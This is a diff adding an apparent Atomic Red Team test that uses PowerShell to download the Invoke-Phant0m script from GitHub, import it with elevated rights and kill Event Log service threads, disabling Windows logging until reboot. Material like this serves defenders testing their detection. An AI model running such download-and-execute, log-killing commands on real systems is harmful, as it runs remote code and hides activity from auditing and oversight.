@@ -21,3 +21,29 @@ atomic_tests:
         C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:false *>$null
       }
     name: powershell
+
+- name: Kill Event Log Service Threads
+  description: Kill Event Log Service Threads using Invoke-Phant0m WARNING you will need to restart PC to return to normal state with Log Service Threads AND to run this again
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
+      Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+      Write-Host "STARTING TO DOWNLOAD Invoke-Phant0m" -fore green
+      $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
+      $output = "$env:TEMP\Invoke-Phant0m.ps1"
+      $wc = New-Object System.Net.WebClient
+      $wc.DownloadFile($url, $output)
+      cd $env:TEMP
+      Write-Host "Import Module Invoke-Phant0m" -fore green
+      Import-Module .\Invoke-Phant0m.ps1
+      Write-Host "STARTING TO Invoke-Phant0m" -fore green
+      Invoke-Phant0m
+    cleanup_command: |-
+      remove-item $Env:Temp\Invoke-Phant0m.ps1 -Force -ErrorAction Ignore
+      Write-Host "There is NO CLEANUP from killing THREADS" -fore green
+      Write-Host "REMOVED ITEM Invoke-Phant0m.ps1 from TEMP" -fore green
+      Write-Host "Need to Restart-Computer to get back Logging" -fore red
+    name: powershell
+    elevation_required: true
